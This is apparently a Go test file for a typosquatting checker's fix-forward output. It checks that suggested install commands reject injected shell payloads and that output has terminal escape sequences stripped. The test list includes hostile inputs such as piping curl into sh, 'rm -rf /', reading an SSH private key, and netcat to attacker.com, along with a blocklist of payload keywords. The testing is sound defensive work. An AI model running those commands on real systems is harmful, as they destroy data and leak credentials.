package ux

import (
	"bytes"
	"encoding/json"
	"strings"
	"sync"
	"testing"
	"time"
)

func TestFixForward_NoShellInjectionInRemediation(t *testing.T) {
	hostilePackages := []string{
		"foo; curl evil.sh | sh",
		"openai; rm -rf /",
		"`id`",
		"$(whoami)",
		"requests && cat ~/.ssh/id_rsa",
		"express | nc attacker.com 4444",
		"openai\nrm -rf /",
		"оpenai", // Cyrillic 'о' homoglyph
		"-rf",
		"--eval=pwn",
		"../etc/passwd",
		"pkg with spaces",
		"'openai'",
		"\"openai\"",
	}

	for _, hostile := range hostilePackages {
		if ValidateRemediationToken(hostile) {
			t.Errorf("ValidateRemediationToken(%q) = true, want false", hostile)
		}
		if cmd := BuildSafeInstallCommand("npm", hostile); cmd != "" {
			t.Errorf("BuildSafeInstallCommand accepted hostile package %q -> %q", hostile, cmd)
		}

		ffe := NewSpellcheckFixForward("npm", hostile, "slopsquat test", 2, 0)
		// Ensure NO shell metacharacters or hostile payloads appear in RemediationCmd
		for _, bad := range []string{";", "|", "`", "$(", "&&", "rm -rf", "curl", "whoami", "id_rsa", "\n"} {
			if strings.Contains(ffe.RemediationCmd, bad) {
				t.Fatalf("SECURITY VIOLATION: RemediationCmd leaked hostile payload %q for input %q: %q", bad, hostile, ffe.RemediationCmd)
			}
		}
	}
}

func TestFixForward_ANSIStripping(t *testing.T) {
	osc52 := "\x1b]52;c;SGVsbG8gd29ybGQ=\x07"
	osc52ST := "\x1b]52;c;cHduZWQ=\x1b\\"
	csi := "\x1b[31m\x1b[2J\x1b[H"
	c1CSI := "\u009b31mRED\u009b0m"
	c1OSC := "\u009d52;c;ZGF0YQ==\u009c"

	ffe := NewSpellcheckFixForward("npm", "opneai"+osc52, csi+"Quarry alert "+osc52ST+c1CSI+c1OSC, 4, 0)

	var defaultBuf, whyBuf, jsonBuf bytes.Buffer
	if err := ffe.Render(&defaultBuf, false, false); err != nil {
		t.Fatalf("default Render failed: %v", err)
	}
	if err := ffe.Render(&whyBuf, false, true); err != nil {
		t.Fatalf("--why Render failed: %v", err)
	}
	if err := ffe.Render(&jsonBuf, true, false); err != nil {
		t.Fatalf("--json Render failed: %v", err)
	}

	for name, out := range map[string]string{
		"default": defaultBuf.String(),
		"why":     whyBuf.String(),
		"json":    jsonBuf.String(),
	} {
		if strings.ContainsRune(out, 0x1b) {
			t.Fatalf("%s output contains raw ESC (0x1b): %q", name, out)
		}
		for _, r := range out {
			if (r < 0x20 && r != '\n' && r != '\t') || r == 0x7f || (r >= 0x80 && r <= 0x9f) {
				t.Fatalf("%s output contains control rune U+%04X: %q", name, r, out)
			}
		}
		if strings.Contains(out, "SGVsbG8") || strings.Contains(out, "cHduZWQ") || strings.Contains(out, "ZGF0YQ") {
			t.Fatalf("%s output leaked OSC 52 payload: %q", name, out)
		}
	}

	lines := strings.Split(strings.TrimSuffix(defaultBuf.String(), "\n"), "\n")
	if len(lines) > 3 {
		t.Fatalf("default FixForward output exceeded 3 lines (%d):\n%s", len(lines), defaultBuf.String())
	}
}

func TestSpellchecker_LevenshteinAndJSONContract(t *testing.T) {
	cases := []struct {
		eco      string
		input    string
		wantPkg  string
		wantCmd  string
	}{
		{"npm", "opneai", "openai", "npm install openai"},
		{"pypi", "reqeusts", "requests", "pip install requests"},
		{"npm", "reactDom", "react-dom", "npm install react-dom"},
		{"cargo", "serd", "serde", "cargo add serde"},
	}

	for _, tc := range cases {
		gotPkg, _, _ := SuggestCanonicalPackage(tc.eco, tc.input)
		if gotPkg != tc.wantPkg {
			t.Errorf("SuggestCanonicalPackage(%q, %q) = %q, want %q", tc.eco, tc.input, gotPkg, tc.wantPkg)
		}

		ffe := NewSpellcheckFixForward(tc.eco, tc.input, "typosquat match", 12, 3)
		if ffe.RemediationCmd != tc.wantCmd {
			t.Errorf("RemediationCmd for %q = %q, want %q", tc.input, ffe.RemediationCmd, tc.wantCmd)
		}

		var jsonBuf bytes.Buffer
		if err := ffe.Render(&jsonBuf, true, false); err != nil {
			t.Fatalf("JSON render failed: %v", err)
		}
		var decoded FixForwardError
		if err := json.Unmarshal(jsonBuf.Bytes(), &decoded); err != nil {
			t.Fatalf("invalid JSON: %v", err)
		}
		if decoded.Tool != "argus" || decoded.Code == "" || decoded.Summary == "" || decoded.RemediationCmd != tc.wantCmd || decoded.WhyOneLiner == "" || decoded.ExitCode != 1 {
			t.Fatalf("JSON contract incomplete: %+v", decoded)
		}
	}
}

func TestHeadlessConcurrency_N8NoPrompts(t *testing.T) {
	start := time.Now()
	var wg sync.WaitGroup
	errs := make(chan error, 8)
	for i := 0; i < 8; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			ffe := NewSpellcheckFixForward("npm", "opneai", "concurrent check", 6, 0)
			var buf bytes.Buffer
			if err := ffe.Render(&buf, true, false); err != nil {
				errs <- err
				return
			}
			var parsed FixForwardError
			if err := json.Unmarshal(buf.Bytes(), &parsed); err != nil {
				errs <- err
				return
			}
		}()
	}
	wg.Wait()
	close(errs)
	for err := range errs {
		t.Fatalf("N=8 worker failed: %v", err)
	}
	if time.Since(start) > 500*time.Millisecond {
		t.Fatalf("N=8 concurrent spellcheck renders exceeded 500ms")
	}
}
